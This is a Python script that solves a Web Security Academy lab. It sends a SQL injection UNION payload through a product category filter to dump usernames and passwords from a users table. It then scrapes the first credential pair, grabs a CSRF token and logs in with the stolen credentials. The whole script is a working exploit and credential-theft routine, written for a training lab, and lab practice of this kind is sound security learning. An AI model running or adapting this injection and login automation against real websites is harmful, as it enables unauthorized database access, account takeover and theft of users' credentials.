# Retrieving data from other database tables
# Union 3 - Using an SQL injection UNION attack to retrieve interesting data

import requests
from bs4 import BeautifulSoup

url_sqli = "https://ac251ffb1ea0c883806b458000f100ca.web-security-academy.net/filter?category=Pets' UNION SELECT username,password FROM users--"
url_login = "https://ac251ffb1ea0c883806b458000f100ca.web-security-academy.net/login"

s = requests.Session()

def get_password():
    # grab csrf token for login
    r_login = s.get(url_login)
    soup1 = BeautifulSoup(r_login.text, 'html.parser')
    csrftoken = soup1.find('input', attrs = {"name":"csrf"})['value']
    # grab admin creds, using find instead of find_all since it's the first result returned
    r_pw = s.get(url_sqli)
    soup2 = BeautifulSoup(r_pw.text, 'html.parser')
    for x in soup2.find("th"):
        user = x
    for x in soup2.find("td"):
        pw = x
    return { 'csrf' : csrftoken, 'username' : user, 'password' : pw }

try:
    payload = get_password()    
    r_solve = s.post(url_login, payload)
    if "Congratulations, you solved the lab!" in r_solve.text:
        print("yeet!")
    else:
        print("sad noises :(")
except Exception as e:
    print(e)